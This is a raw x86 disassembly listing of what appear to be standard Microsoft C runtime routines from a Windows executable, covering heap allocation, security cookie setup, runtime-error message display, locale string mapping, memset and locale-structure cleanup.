  427541:	push   0x4
  427543:	call   0x42555b
  427548:	pop    ecx
  427549:	ret    
  42754a:	xor    eax,eax
  42754c:	cmp    esi,0xffffffe0
  42754f:	ja     0x427567
  427551:	cmp    esi,ebx
  427553:	jne    0x427558
  427555:	xor    esi,esi
  427557:	inc    esi
  427558:	push   esi
  427559:	push   edi
  42755a:	push   ebx
  42755b:	push   DWORD PTR ds:0x463c40
  427561:	call   DWORD PTR ds:0x42910c
  427567:	cmp    eax,ebx
  427569:	jne    0x427580
  42756b:	cmp    DWORD PTR ds:0x4638c8,ebx
  427571:	je     0x427580
  427573:	push   esi
  427574:	call   0x427d12
  427579:	pop    ecx
  42757a:	test   eax,eax
  42757c:	jne    0x42754a
  42757e:	xor    eax,eax
  427580:	call   0x42546f
  427585:	ret    
  427586:	push   0x10
  427588:	push   0x4298d0
  42758d:	call   0x425434
  427592:	cmp    DWORD PTR ds:0x463c44,0x3
  427599:	jne    0x4275d5
  42759b:	push   0x4
  42759d:	call   0x4255ef
  4275a2:	pop    ecx
  4275a3:	and    DWORD PTR [ebp-0x4],0x0
  4275a7:	mov    esi,DWORD PTR [ebp+0x8]
  4275aa:	push   esi
  4275ab:	call   0x426812
  4275b0:	pop    ecx
  4275b1:	mov    DWORD PTR [ebp-0x1c],eax
  4275b4:	test   eax,eax
  4275b6:	je     0x4275c3
  4275b8:	mov    esi,DWORD PTR [esi-0x4]
  4275bb:	sub    esi,0x9
  4275be:	mov    DWORD PTR [ebp-0x20],esi
  4275c1:	jmp    0x4275c6
  4275c3:	mov    esi,DWORD PTR [ebp-0x20]
  4275c6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275ca:	call   0x4275f3
  4275cf:	cmp    DWORD PTR [ebp-0x1c],0x0
  4275d3:	jne    0x4275e8
  4275d5:	push   DWORD PTR [ebp+0x8]
  4275d8:	push   0x0
  4275da:	push   DWORD PTR ds:0x463c40
  4275e0:	call   DWORD PTR ds:0x429110
  4275e6:	mov    esi,eax
  4275e8:	mov    eax,esi
  4275ea:	call   0x42546f
  4275ef:	ret    
  4275f0:	mov    esi,DWORD PTR [ebp-0x20]
  4275f3:	push   0x4
  4275f5:	call   0x42555b
  4275fa:	pop    ecx
  4275fb:	ret    
  4275fc:	push   ebp
  4275fd:	mov    ebp,esp
  4275ff:	sub    esp,0x10
  427602:	push   esi
  427603:	lea    eax,[ebp-0x8]
  427606:	push   eax
  427607:	call   DWORD PTR ds:0x429120
  42760d:	mov    esi,DWORD PTR [ebp-0x4]
  427610:	xor    esi,DWORD PTR [ebp-0x8]
  427613:	call   DWORD PTR ds:0x42911c
  427619:	xor    esi,eax
  42761b:	call   DWORD PTR ds:0x4290d8
  427621:	xor    esi,eax
  427623:	call   DWORD PTR ds:0x429118
  427629:	xor    esi,eax
  42762b:	lea    eax,[ebp-0x10]
  42762e:	push   eax
  42762f:	call   DWORD PTR ds:0x429114
  427635:	mov    eax,DWORD PTR [ebp-0xc]
  427638:	xor    eax,DWORD PTR [ebp-0x10]
  42763b:	xor    esi,eax
  42763d:	mov    DWORD PTR ds:0x462f30,esi
  427643:	jne    0x42764f
  427645:	mov    DWORD PTR ds:0x462f30,0xbb40e64e
  42764f:	pop    esi
  427650:	leave  
  427651:	ret    
  427652:	push   0x118
  427657:	push   0x429a80
  42765c:	call   0x425434
  427661:	mov    eax,ds:0x462f30
  427666:	xor    eax,DWORD PTR [ebp+0x4]
  427669:	mov    DWORD PTR [ebp-0x1c],eax
  42766c:	mov    eax,ds:0x463898
  427671:	xor    ecx,ecx
  427673:	cmp    eax,ecx
  427675:	je     0x427696
  427677:	mov    DWORD PTR [ebp-0x4],ecx
  42767a:	push   DWORD PTR [ebp+0xc]
  42767d:	push   DWORD PTR [ebp+0x8]
  427680:	call   eax
  427682:	pop    ecx
  427683:	pop    ecx
  427684:	or     DWORD PTR [ebp-0x4],0xffffffff
  427688:	jmp    0x427794
  42768d:	xor    eax,eax
  42768f:	inc    eax
  427690:	ret    
  427691:	mov    esp,DWORD PTR [ebp-0x18]
  427694:	jmp    0x427684
  427696:	mov    eax,DWORD PTR [ebp+0x8]
  427699:	dec    eax
  42769a:	je     0x4276af
  42769c:	mov    edi,0x429a5c
  4276a1:	mov    DWORD PTR [ebp-0x20],0x4299a8
  4276a8:	mov    esi,0xd4
  4276ad:	jmp    0x4276c0
  4276af:	mov    edi,0x429988
  4276b4:	mov    DWORD PTR [ebp-0x20],0x4298e8
  4276bb:	mov    esi,0xb9
  4276c0:	mov    BYTE PTR [ebp-0x24],cl
  4276c3:	push   0x104
  4276c8:	lea    eax,[ebp-0x128]
  4276ce:	push   eax
  4276cf:	push   ecx
  4276d0:	call   DWORD PTR ds:0x4290a8
  4276d6:	test   eax,eax
  4276d8:	jne    0x4276ed
  4276da:	push   0x4295dc
  4276df:	lea    eax,[ebp-0x128]
  4276e5:	push   eax
  4276e6:	call   0x425810
  4276eb:	pop    ecx
  4276ec:	pop    ecx
  4276ed:	lea    ebx,[ebp-0x128]
  4276f3:	lea    eax,[ebp-0x128]
  4276f9:	push   eax
  4276fa:	call   0x425a40
  4276ff:	pop    ecx
  427700:	add    eax,0xb
  427703:	cmp    eax,0x3c
  427706:	jbe    0x427731
  427708:	lea    eax,[ebp-0x128]
  42770e:	push   eax
  42770f:	call   0x425a40
  427714:	mov    ebx,eax
  427716:	lea    eax,[ebp-0x128]
  42771c:	sub    eax,0x31
  42771f:	add    ebx,eax
  427721:	push   0x3
  427723:	push   0x4295d8
  427728:	push   ebx
  427729:	call   0x425910
  42772e:	add    esp,0x10
  427731:	push   ebx
  427732:	call   0x425a40
  427737:	pop    ecx
  427738:	lea    eax,[eax+esi*1+0xc]
  42773c:	add    eax,0x3
  42773f:	and    eax,0xfffffffc
  427742:	call   0x425480
  427747:	mov    DWORD PTR [ebp-0x18],esp
  42774a:	mov    esi,esp
  42774c:	push   edi
  42774d:	push   esi
  42774e:	call   0x425810
  427753:	mov    edi,0x4295b8
  427758:	push   edi
  427759:	push   esi
  42775a:	call   0x425820
  42775f:	push   0x4298dc
  427764:	push   esi
  427765:	call   0x425820
  42776a:	push   ebx
  42776b:	push   esi
  42776c:	call   0x425820
  427771:	push   edi
  427772:	push   esi
  427773:	call   0x425820
  427778:	push   DWORD PTR [ebp-0x20]
  42777b:	push   esi
  42777c:	call   0x425820
  427781:	push   0x12010
  427786:	push   0x429590
  42778b:	push   esi
  42778c:	call   0x425712
  427791:	add    esp,0x3c
  427794:	push   0x3
  427796:	call   0x4248a2
  42779b:	int3   
  42779c:	push   0x38
  42779e:	push   0x429ea0
  4277a3:	call   0x425434
  4277a8:	xor    ebx,ebx
  4277aa:	cmp    DWORD PTR ds:0x4638bc,ebx
  4277b0:	jne    0x4277ea
  4277b2:	push   ebx
  4277b3:	push   ebx
  4277b4:	xor    esi,esi
  4277b6:	inc    esi
  4277b7:	push   esi
  4277b8:	push   0x429e9c
  4277bd:	push   0x100
  4277c2:	push   ebx
  4277c3:	call   DWORD PTR ds:0x42912c
  4277c9:	test   eax,eax
  4277cb:	je     0x4277d5
  4277cd:	mov    DWORD PTR ds:0x4638bc,esi
  4277d3:	jmp    0x4277ea
  4277d5:	call   DWORD PTR ds:0x429030
  4277db:	cmp    eax,0x78
  4277de:	jne    0x4277ea
  4277e0:	mov    DWORD PTR ds:0x4638bc,0x2
  4277ea:	cmp    DWORD PTR [ebp+0x14],ebx
  4277ed:	jle    0x42780a
  4277ef:	mov    ecx,DWORD PTR [ebp+0x14]
  4277f2:	mov    eax,DWORD PTR [ebp+0x10]
  4277f5:	dec    ecx
  4277f6:	cmp    BYTE PTR [eax],bl
  4277f8:	je     0x427802
  4277fa:	inc    eax
  4277fb:	cmp    ecx,ebx
  4277fd:	jne    0x4277f5
  4277ff:	or     ecx,0xffffffff
  427802:	or     eax,0xffffffff
  427805:	sub    eax,ecx
  427807:	add    DWORD PTR [ebp+0x14],eax
  42780a:	mov    eax,ds:0x4638bc
  42780f:	cmp    eax,0x2
  427812:	je     0x4279f4
  427818:	cmp    eax,ebx
  42781a:	je     0x4279f4
  427820:	cmp    eax,0x1
  427823:	jne    0x427a27
  427829:	xor    edi,edi
  42782b:	mov    DWORD PTR [ebp-0x1c],edi
  42782e:	mov    DWORD PTR [ebp-0x20],ebx
  427831:	mov    DWORD PTR [ebp-0x24],ebx
  427834:	cmp    DWORD PTR [ebp+0x20],ebx
  427837:	jne    0x427841
  427839:	mov    eax,ds:0x4638b4
  42783e:	mov    DWORD PTR [ebp+0x20],eax
  427841:	push   ebx
  427842:	push   ebx
  427843:	push   DWORD PTR [ebp+0x14]
  427846:	push   DWORD PTR [ebp+0x10]
  427849:	xor    eax,eax
  42784b:	cmp    DWORD PTR [ebp+0x24],ebx
  42784e:	setne  al
  427851:	lea    eax,[eax*8+0x1]
  427858:	push   eax
  427859:	push   DWORD PTR [ebp+0x20]
  42785c:	call   DWORD PTR ds:0x429128
  427862:	mov    esi,eax
  427864:	mov    DWORD PTR [ebp-0x28],esi
  427867:	cmp    esi,ebx
  427869:	je     0x427a27
  42786f:	mov    DWORD PTR [ebp-0x4],0x1
  427876:	lea    eax,[esi+esi*1]
  427879:	add    eax,0x3
  42787c:	and    eax,0xfffffffc
  42787f:	call   0x425480
  427884:	mov    DWORD PTR [ebp-0x18],esp
  427887:	mov    eax,esp
  427889:	mov    DWORD PTR [ebp-0x2c],eax
  42788c:	or     DWORD PTR [ebp-0x4],0xffffffff
  427890:	jmp    0x4278ad
  427892:	xor    eax,eax
  427894:	inc    eax
  427895:	ret    
  427896:	mov    esp,DWORD PTR [ebp-0x18]
  427899:	call   0x4288c5
  42789e:	xor    ebx,ebx
  4278a0:	mov    DWORD PTR [ebp-0x2c],ebx
  4278a3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4278a7:	mov    edi,DWORD PTR [ebp-0x1c]
  4278aa:	mov    esi,DWORD PTR [ebp-0x28]
  4278ad:	cmp    DWORD PTR [ebp-0x2c],ebx
  4278b0:	jne    0x4278ce
  4278b2:	lea    eax,[esi+esi*1]
  4278b5:	push   eax
  4278b6:	call   0x426152
  4278bb:	pop    ecx
  4278bc:	mov    DWORD PTR [ebp-0x2c],eax
  4278bf:	cmp    eax,ebx
  4278c1:	je     0x427a27
  4278c7:	mov    DWORD PTR [ebp-0x20],0x1
  4278ce:	push   esi
  4278cf:	push   DWORD PTR [ebp-0x2c]
  4278d2:	push   DWORD PTR [ebp+0x14]
  4278d5:	push   DWORD PTR [ebp+0x10]
  4278d8:	push   0x1
  4278da:	push   DWORD PTR [ebp+0x20]
  4278dd:	call   DWORD PTR ds:0x429128
  4278e3:	test   eax,eax
  4278e5:	je     0x4279d1
  4278eb:	push   ebx
  4278ec:	push   ebx
  4278ed:	push   esi
  4278ee:	push   DWORD PTR [ebp-0x2c]
  4278f1:	push   DWORD PTR [ebp+0xc]
  4278f4:	push   DWORD PTR [ebp+0x8]
  4278f7:	call   DWORD PTR ds:0x42912c
  4278fd:	mov    edi,eax
  4278ff:	mov    DWORD PTR [ebp-0x1c],edi
  427902:	cmp    edi,ebx
  427904:	je     0x4279d1
  42790a:	test   BYTE PTR [ebp+0xd],0x4
  42790e:	je     0x42793d
  427910:	cmp    DWORD PTR [ebp+0x1c],ebx
  427913:	je     0x4279d1
  427919:	cmp    edi,DWORD PTR [ebp+0x1c]
  42791c:	jg     0x4279d1
  427922:	push   DWORD PTR [ebp+0x1c]
  427925:	push   DWORD PTR [ebp+0x18]
  427928:	push   esi
  427929:	push   DWORD PTR [ebp-0x2c]
  42792c:	push   DWORD PTR [ebp+0xc]
  42792f:	push   DWORD PTR [ebp+0x8]
  427932:	call   DWORD PTR ds:0x42912c
  427938:	jmp    0x4279d1
  42793d:	mov    DWORD PTR [ebp-0x4],0x2
  427944:	lea    eax,[edi+edi*1]
  427947:	add    eax,0x3
  42794a:	and    eax,0xfffffffc
  42794d:	call   0x425480
  427952:	mov    DWORD PTR [ebp-0x18],esp
  427955:	mov    eax,esp
  427957:	mov    DWORD PTR [ebp-0x30],eax
  42795a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42795e:	jmp    0x42797b
  427960:	xor    eax,eax
  427962:	inc    eax
  427963:	ret    
  427964:	mov    esp,DWORD PTR [ebp-0x18]
  427967:	call   0x4288c5
  42796c:	xor    ebx,ebx
  42796e:	mov    DWORD PTR [ebp-0x30],ebx
  427971:	or     DWORD PTR [ebp-0x4],0xffffffff
  427975:	mov    edi,DWORD PTR [ebp-0x1c]
  427978:	mov    esi,DWORD PTR [ebp-0x28]
  42797b:	cmp    DWORD PTR [ebp-0x30],ebx
  42797e:	jne    0x427998
  427980:	lea    eax,[edi+edi*1]
  427983:	push   eax
  427984:	call   0x426152
  427989:	pop    ecx
  42798a:	mov    DWORD PTR [ebp-0x30],eax
  42798d:	cmp    eax,ebx
  42798f:	je     0x4279d1
  427991:	mov    DWORD PTR [ebp-0x24],0x1
  427998:	push   edi
  427999:	push   DWORD PTR [ebp-0x30]
  42799c:	push   esi
  42799d:	push   DWORD PTR [ebp-0x2c]
  4279a0:	push   DWORD PTR [ebp+0xc]
  4279a3:	push   DWORD PTR [ebp+0x8]
  4279a6:	call   DWORD PTR ds:0x42912c
  4279ac:	test   eax,eax
  4279ae:	je     0x4279d1
  4279b0:	push   ebx
  4279b1:	push   ebx
  4279b2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4279b5:	jne    0x4279bb
  4279b7:	push   ebx
  4279b8:	push   ebx
  4279b9:	jmp    0x4279c1
  4279bb:	push   DWORD PTR [ebp+0x1c]
  4279be:	push   DWORD PTR [ebp+0x18]
  4279c1:	push   edi
  4279c2:	push   DWORD PTR [ebp-0x30]
  4279c5:	push   ebx
  4279c6:	push   DWORD PTR [ebp+0x20]
  4279c9:	call   DWORD PTR ds:0x4290bc
  4279cf:	mov    edi,eax
  4279d1:	cmp    DWORD PTR [ebp-0x24],ebx
  4279d4:	je     0x4279df
  4279d6:	push   DWORD PTR [ebp-0x30]
  4279d9:	call   0x42603a
  4279de:	pop    ecx
  4279df:	cmp    DWORD PTR [ebp-0x20],ebx
  4279e2:	je     0x4279ed
  4279e4:	push   DWORD PTR [ebp-0x2c]
  4279e7:	call   0x42603a
  4279ec:	pop    ecx
  4279ed:	mov    eax,edi
  4279ef:	jmp    0x427b4f
  4279f4:	mov    DWORD PTR [ebp-0x34],ebx
  4279f7:	xor    edi,edi
  4279f9:	mov    DWORD PTR [ebp-0x38],ebx
  4279fc:	cmp    DWORD PTR [ebp+0x8],ebx
  4279ff:	jne    0x427a09
  427a01:	mov    eax,ds:0x4638a4
  427a06:	mov    DWORD PTR [ebp+0x8],eax
  427a09:	cmp    DWORD PTR [ebp+0x20],ebx
  427a0c:	jne    0x427a16
  427a0e:	mov    eax,ds:0x4638b4
  427a13:	mov    DWORD PTR [ebp+0x20],eax
  427a16:	push   DWORD PTR [ebp+0x8]
  427a19:	call   0x4286ad
  427a1e:	pop    ecx
  427a1f:	mov    DWORD PTR [ebp-0x3c],eax
  427a22:	cmp    eax,0xffffffff
  427a25:	jne    0x427a2e
  427a27:	xor    eax,eax
  427a29:	jmp    0x427b4f
  427a2e:	cmp    eax,DWORD PTR [ebp+0x20]
  427a31:	je     0x427b25
  427a37:	push   ebx
  427a38:	push   ebx
  427a39:	lea    ecx,[ebp+0x14]
  427a3c:	push   ecx
  427a3d:	push   DWORD PTR [ebp+0x10]
  427a40:	push   eax
  427a41:	push   DWORD PTR [ebp+0x20]
  427a44:	call   0x4286f6
  427a49:	add    esp,0x18
  427a4c:	mov    DWORD PTR [ebp-0x34],eax
  427a4f:	cmp    eax,ebx
  427a51:	je     0x427a27
  427a53:	push   ebx
  427a54:	push   ebx
  427a55:	push   DWORD PTR [ebp+0x14]
  427a58:	push   eax
  427a59:	push   DWORD PTR [ebp+0xc]
  427a5c:	push   DWORD PTR [ebp+0x8]
  427a5f:	call   DWORD PTR ds:0x429124
  427a65:	mov    esi,eax
  427a67:	mov    DWORD PTR [ebp-0x40],esi
  427a6a:	cmp    esi,ebx
  427a6c:	je     0x427b14
  427a72:	mov    DWORD PTR [ebp-0x4],ebx
  427a75:	add    eax,0x3
  427a78:	and    eax,0xfffffffc
  427a7b:	call   0x425480
  427a80:	mov    DWORD PTR [ebp-0x18],esp
  427a83:	mov    edi,esp
  427a85:	mov    DWORD PTR [ebp-0x44],edi
  427a88:	push   esi
  427a89:	push   ebx
  427a8a:	push   edi
  427a8b:	call   0x427d30
  427a90:	add    esp,0xc
  427a93:	jmp    0x427aa5
  427a95:	xor    eax,eax
  427a97:	inc    eax
  427a98:	ret    
  427a99:	mov    esp,DWORD PTR [ebp-0x18]
  427a9c:	call   0x4288c5
  427aa1:	xor    ebx,ebx
  427aa3:	xor    edi,edi
  427aa5:	or     DWORD PTR [ebp-0x4],0xffffffff
  427aa9:	cmp    edi,ebx
  427aab:	jne    0x427ad0
  427aad:	push   DWORD PTR [ebp-0x40]
  427ab0:	call   0x426152
  427ab5:	pop    ecx
  427ab6:	mov    edi,eax
  427ab8:	cmp    edi,ebx
  427aba:	je     0x427aed
  427abc:	push   DWORD PTR [ebp-0x40]
  427abf:	push   ebx
  427ac0:	push   edi
  427ac1:	call   0x427d30
  427ac6:	add    esp,0xc
  427ac9:	mov    DWORD PTR [ebp-0x38],0x1
  427ad0:	push   DWORD PTR [ebp-0x40]
  427ad3:	push   edi
  427ad4:	push   DWORD PTR [ebp+0x14]
  427ad7:	push   DWORD PTR [ebp-0x34]
  427ada:	push   DWORD PTR [ebp+0xc]
  427add:	push   DWORD PTR [ebp+0x8]
  427ae0:	call   DWORD PTR ds:0x429124
  427ae6:	mov    DWORD PTR [ebp-0x40],eax
  427ae9:	cmp    eax,ebx
  427aeb:	jne    0x427af1
  427aed:	xor    esi,esi
  427aef:	jmp    0x427b17
  427af1:	push   DWORD PTR [ebp+0x1c]
  427af4:	push   DWORD PTR [ebp+0x18]
  427af7:	lea    eax,[ebp-0x40]
  427afa:	push   eax
  427afb:	push   edi
  427afc:	push   DWORD PTR [ebp+0x20]
  427aff:	push   DWORD PTR [ebp-0x3c]
  427b02:	call   0x4286f6
  427b07:	add    esp,0x18
  427b0a:	mov    esi,eax
  427b0c:	neg    esi
  427b0e:	sbb    esi,esi
  427b10:	neg    esi
  427b12:	jmp    0x427b17
  427b14:	mov    esi,DWORD PTR [ebp-0x48]
  427b17:	cmp    DWORD PTR [ebp-0x38],ebx
  427b1a:	je     0x427b3f
  427b1c:	push   edi
  427b1d:	call   0x42603a
  427b22:	pop    ecx
  427b23:	jmp    0x427b3f
  427b25:	push   DWORD PTR [ebp+0x1c]
  427b28:	push   DWORD PTR [ebp+0x18]
  427b2b:	push   DWORD PTR [ebp+0x14]
  427b2e:	push   DWORD PTR [ebp+0x10]
  427b31:	push   DWORD PTR [ebp+0xc]
  427b34:	push   DWORD PTR [ebp+0x8]
  427b37:	call   DWORD PTR ds:0x429124
  427b3d:	mov    esi,eax
  427b3f:	cmp    DWORD PTR [ebp-0x34],ebx
  427b42:	je     0x427b4d
  427b44:	push   DWORD PTR [ebp-0x34]
  427b47:	call   0x42603a
  427b4c:	pop    ecx
  427b4d:	mov    eax,esi
  427b4f:	lea    esp,[ebp-0x54]
  427b52:	call   0x42546f
  427b57:	ret    
  427b58:	push   0x1c
  427b5a:	push   0x429ec8
  427b5f:	call   0x425434
  427b64:	xor    esi,esi
  427b66:	cmp    DWORD PTR ds:0x4638c0,esi
  427b6c:	jne    0x427ba3
  427b6e:	lea    eax,[ebp-0x1c]
  427b71:	push   eax
  427b72:	xor    edi,edi
  427b74:	inc    edi
  427b75:	push   edi
  427b76:	push   0x429e9c
  427b7b:	push   edi
  427b7c:	call   DWORD PTR ds:0x429134
  427b82:	test   eax,eax
  427b84:	je     0x427b8e
  427b86:	mov    DWORD PTR ds:0x4638c0,edi
  427b8c:	jmp    0x427ba3
  427b8e:	call   DWORD PTR ds:0x429030
  427b94:	cmp    eax,0x78
  427b97:	jne    0x427ba3
  427b99:	mov    DWORD PTR ds:0x4638c0,0x2
  427ba3:	mov    eax,ds:0x4638c0
  427ba8:	cmp    eax,0x2
  427bab:	je     0x427c9b
  427bb1:	cmp    eax,esi
  427bb3:	je     0x427c9b
  427bb9:	cmp    eax,0x1
  427bbc:	jne    0x427cc1
  427bc2:	mov    DWORD PTR [ebp-0x20],esi
  427bc5:	mov    DWORD PTR [ebp-0x24],esi
  427bc8:	cmp    DWORD PTR [ebp+0x18],esi
  427bcb:	jne    0x427bd5
  427bcd:	mov    eax,ds:0x4638b4
  427bd2:	mov    DWORD PTR [ebp+0x18],eax
  427bd5:	push   esi
  427bd6:	push   esi
  427bd7:	push   DWORD PTR [ebp+0x10]
  427bda:	push   DWORD PTR [ebp+0xc]
  427bdd:	xor    eax,eax
  427bdf:	cmp    DWORD PTR [ebp+0x20],esi
  427be2:	setne  al
  427be5:	lea    eax,[eax*8+0x1]
  427bec:	push   eax
  427bed:	push   DWORD PTR [ebp+0x18]
  427bf0:	call   DWORD PTR ds:0x429128
  427bf6:	mov    edi,eax
  427bf8:	mov    DWORD PTR [ebp-0x28],edi
  427bfb:	test   edi,edi
  427bfd:	je     0x427cc1
  427c03:	and    DWORD PTR [ebp-0x4],0x0
  427c07:	lea    ebx,[edi+edi*1]
  427c0a:	mov    eax,ebx
  427c0c:	add    eax,0x3
  427c0f:	and    eax,0xfffffffc
  427c12:	call   0x425480
  427c17:	mov    DWORD PTR [ebp-0x18],esp
  427c1a:	mov    esi,esp
  427c1c:	mov    DWORD PTR [ebp-0x2c],esi
  427c1f:	push   ebx
  427c20:	push   0x0
  427c22:	push   esi
  427c23:	call   0x427d30
  427c28:	add    esp,0xc
  427c2b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c2f:	jmp    0x427c46
  427c31:	xor    eax,eax
  427c33:	inc    eax
  427c34:	ret    
  427c35:	mov    esp,DWORD PTR [ebp-0x18]
  427c38:	call   0x4288c5
  427c3d:	xor    esi,esi
  427c3f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c43:	mov    edi,DWORD PTR [ebp-0x28]
  427c46:	test   esi,esi
  427c48:	jne    0x427c61
  427c4a:	push   edi
  427c4b:	push   0x2
  427c4d:	call   0x426548
  427c52:	pop    ecx
  427c53:	pop    ecx
  427c54:	mov    esi,eax
  427c56:	test   esi,esi
  427c58:	je     0x427cc1
  427c5a:	mov    DWORD PTR [ebp-0x24],0x1
  427c61:	push   edi
  427c62:	push   esi
  427c63:	push   DWORD PTR [ebp+0x10]
  427c66:	push   DWORD PTR [ebp+0xc]
  427c69:	push   0x1
  427c6b:	push   DWORD PTR [ebp+0x18]
  427c6e:	call   DWORD PTR ds:0x429128
  427c74:	test   eax,eax
  427c76:	je     0x427c89
  427c78:	push   DWORD PTR [ebp+0x14]
  427c7b:	push   eax
  427c7c:	push   esi
  427c7d:	push   DWORD PTR [ebp+0x8]
  427c80:	call   DWORD PTR ds:0x429134
  427c86:	mov    DWORD PTR [ebp-0x20],eax
  427c89:	cmp    DWORD PTR [ebp-0x24],0x0
  427c8d:	je     0x427c96
  427c8f:	push   esi
  427c90:	call   0x42603a
  427c95:	pop    ecx
  427c96:	mov    eax,DWORD PTR [ebp-0x20]
  427c99:	jmp    0x427d09
  427c9b:	mov    ebx,DWORD PTR [ebp+0x1c]
  427c9e:	cmp    ebx,esi
  427ca0:	jne    0x427ca8
  427ca2:	mov    ebx,DWORD PTR ds:0x4638a4
  427ca8:	mov    edi,DWORD PTR [ebp+0x18]
  427cab:	test   edi,edi
  427cad:	jne    0x427cb5
  427caf:	mov    edi,DWORD PTR ds:0x4638b4
  427cb5:	push   ebx
  427cb6:	call   0x4286ad
  427cbb:	pop    ecx
  427cbc:	cmp    eax,0xffffffff
  427cbf:	jne    0x427cc5
  427cc1:	xor    eax,eax
  427cc3:	jmp    0x427d09
  427cc5:	cmp    eax,edi
  427cc7:	je     0x427ce7
  427cc9:	push   0x0
  427ccb:	push   0x0
  427ccd:	lea    ecx,[ebp+0x10]
  427cd0:	push   ecx
  427cd1:	push   DWORD PTR [ebp+0xc]
  427cd4:	push   eax
  427cd5:	push   edi
  427cd6:	call   0x4286f6
  427cdb:	add    esp,0x18
  427cde:	mov    esi,eax
  427ce0:	test   esi,esi
  427ce2:	je     0x427cc1
  427ce4:	mov    DWORD PTR [ebp+0xc],esi
  427ce7:	push   DWORD PTR [ebp+0x14]
  427cea:	push   DWORD PTR [ebp+0x10]
  427ced:	push   DWORD PTR [ebp+0xc]
  427cf0:	push   DWORD PTR [ebp+0x8]
  427cf3:	push   ebx
  427cf4:	call   DWORD PTR ds:0x429130
  427cfa:	mov    edi,eax
  427cfc:	test   esi,esi
  427cfe:	je     0x427d07
  427d00:	push   esi
  427d01:	call   0x42603a
  427d06:	pop    ecx
  427d07:	mov    eax,edi
  427d09:	lea    esp,[ebp-0x38]
  427d0c:	call   0x42546f
  427d11:	ret    
  427d12:	mov    eax,ds:0x4638c4
  427d17:	test   eax,eax
  427d19:	je     0x427d2a
  427d1b:	push   DWORD PTR [esp+0x4]
  427d1f:	call   eax
  427d21:	test   eax,eax
  427d23:	pop    ecx
  427d24:	je     0x427d2a
  427d26:	xor    eax,eax
  427d28:	inc    eax
  427d29:	ret    
  427d2a:	xor    eax,eax
  427d2c:	ret    
  427d2d:	int3   
  427d2e:	int3   
  427d2f:	int3   
  427d30:	mov    edx,DWORD PTR [esp+0xc]
  427d34:	mov    ecx,DWORD PTR [esp+0x4]
  427d38:	test   edx,edx
  427d3a:	je     0x427d8b
  427d3c:	xor    eax,eax
  427d3e:	mov    al,BYTE PTR [esp+0x8]
  427d42:	push   edi
  427d43:	mov    edi,ecx
  427d45:	cmp    edx,0x4
  427d48:	jb     0x427d7b
  427d4a:	neg    ecx
  427d4c:	and    ecx,0x3
  427d4f:	je     0x427d5d
  427d51:	sub    edx,ecx
  427d53:	mov    BYTE PTR [edi],al
  427d55:	add    edi,0x1
  427d58:	sub    ecx,0x1
  427d5b:	jne    0x427d53
  427d5d:	mov    ecx,eax
  427d5f:	shl    eax,0x8
  427d62:	add    eax,ecx
  427d64:	mov    ecx,eax
  427d66:	shl    eax,0x10
  427d69:	add    eax,ecx
  427d6b:	mov    ecx,edx
  427d6d:	and    edx,0x3
  427d70:	shr    ecx,0x2
  427d73:	je     0x427d7b
  427d75:	rep stos DWORD PTR es:[edi],eax
  427d77:	test   edx,edx
  427d79:	je     0x427d85
  427d7b:	mov    BYTE PTR [edi],al
  427d7d:	add    edi,0x1
  427d80:	sub    edx,0x1
  427d83:	jne    0x427d7b
  427d85:	mov    eax,DWORD PTR [esp+0x8]
  427d89:	pop    edi
  427d8a:	ret    
  427d8b:	mov    eax,DWORD PTR [esp+0x4]
  427d8f:	ret    
  427d90:	push   esi
  427d91:	mov    esi,DWORD PTR [esp+0x8]
  427d95:	test   esi,esi
  427d97:	je     0x427f1e
  427d9d:	push   DWORD PTR [esi+0x4]
  427da0:	call   0x42603a
  427da5:	push   DWORD PTR [esi+0x8]
  427da8:	call   0x42603a
  427dad:	push   DWORD PTR [esi+0xc]
  427db0:	call   0x42603a
  427db5:	push   DWORD PTR [esi+0x10]
  427db8:	call   0x42603a
  427dbd:	push   DWORD PTR [esi+0x14]
  427dc0:	call   0x42603a
  427dc5:	push   DWORD PTR [esi+0x18]
  427dc8:	call   0x42603a
  427dcd:	push   DWORD PTR [esi]
  427dcf:	call   0x42603a
  427dd4:	push   DWORD PTR [esi+0x20]
  427dd7:	call   0x42603a
  427ddc:	push   DWORD PTR [esi+0x24]
  427ddf:	call   0x42603a
  427de4:	push   DWORD PTR [esi+0x28]
  427de7:	call   0x42603a
  427dec:	push   DWORD PTR [esi+0x2c]
  427def:	call   0x42603a
  427df4:	push   DWORD PTR [esi+0x30]
  427df7:	call   0x42603a
  427dfc:	push   DWORD PTR [esi+0x34]
  427dff:	call   0x42603a
  427e04:	push   DWORD PTR [esi+0x1c]
  427e07:	call   0x42603a
  427e0c:	push   DWORD PTR [esi+0x38]
  427e0f:	call   0x42603a
  427e14:	push   DWORD PTR [esi+0x3c]
  427e17:	call   0x42603a
  427e1c:	add    esp,0x40
  427e1f:	push   DWORD PTR [esi+0x40]
  427e22:	call   0x42603a
  427e27:	push   DWORD PTR [esi+0x44]
  427e2a:	call   0x42603a
  427e2f:	push   DWORD PTR [esi+0x48]
  427e32:	call   0x42603a
  427e37:	push   DWORD PTR [esi+0x4c]
  427e3a:	call   0x42603a
  427e3f:	push   DWORD PTR [esi+0x50]
  427e42:	call   0x42603a
  427e47:	push   DWORD PTR [esi+0x54]
  427e4a:	call   0x42603a
  427e4f:	push   DWORD PTR [esi+0x58]
  427e52:	call   0x42603a
  427e57:	push   DWORD PTR [esi+0x5c]
  427e5a:	call   0x42603a
  427e5f:	push   DWORD PTR [esi+0x60]
  427e62:	call   0x42603a
  427e67:	push   DWORD PTR [esi+0x64]
  427e6a:	call   0x42603a
  427e6f:	push   DWORD PTR [esi+0x68]
  427e72:	call   0x42603a
  427e77:	push   DWORD PTR [esi+0x6c]
  427e7a:	call   0x42603a
  427e7f:	push   DWORD PTR [esi+0x70]
  427e82:	call   0x42603a
  427e87:	push   DWORD PTR [esi+0x74]
  427e8a:	call   0x42603a
  427e8f:	push   DWORD PTR [esi+0x78]
  427e92:	call   0x42603a
  427e97:	push   DWORD PTR [esi+0x7c]
  427e9a:	call   0x42603a
  427e9f:	add    esp,0x40
  427ea2:	push   DWORD PTR [esi+0x80]
  427ea8:	call   0x42603a
  427ead:	push   DWORD PTR [esi+0x84]
  427eb3:	call   0x42603a
  427eb8:	push   DWORD PTR [esi+0x88]
  427ebe:	call   0x42603a
